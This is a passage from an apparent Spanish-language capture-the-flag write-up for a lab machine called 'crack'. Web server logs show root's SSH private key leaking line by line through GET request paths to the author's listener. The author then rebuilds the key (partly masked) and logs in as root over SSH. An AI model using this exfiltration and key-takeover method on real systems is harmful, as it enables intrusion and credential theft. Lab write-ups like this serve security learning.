10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1" 404 -
10.0.2.123 - - [09/Jun/2023 12:05:34] code 404, message File not found
10.0.2.123 - - [09/Jun/2023 12:05:34] "GET /-----END HTTP/1.1" 404 -
```
Ahora lo que hice fue con regex tratar de copiar solo las líneas de la id\_rsa, pero como no las domino por completo esto me quedo a medias y al final tuve que hacerlo copiando y pegando las líneas.
Al final de este proceso la id\_rsa debería quedarte de esta forma.
```bash
cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn
b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt
xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf
tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k
/+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu
yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl
Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c
9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2
EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0
Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2
wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado
arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI
j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn
b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg
Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR
Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg
3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2
m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/
a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN
peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u
TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG
TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D
Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA
wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo
0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO
1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP
WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
*************************
-----END OPENSSH PRIVATE KEY-----
```
Copie y pegue el contenido de la id\_rsa en el directorio home de cris, le di permisos 600 y trate de conectarme como root.
```bash
cris@crack:~$ nano id_rsa
cris@crack:~$ chmod 600 id_rsa
cris@crack:~$ ssh -i id_rsa root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKOVzGc0V7/s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  7 22:11:49 2023
root@crack:~ whoami
root
```
Hemos pwneado la maquina!!!
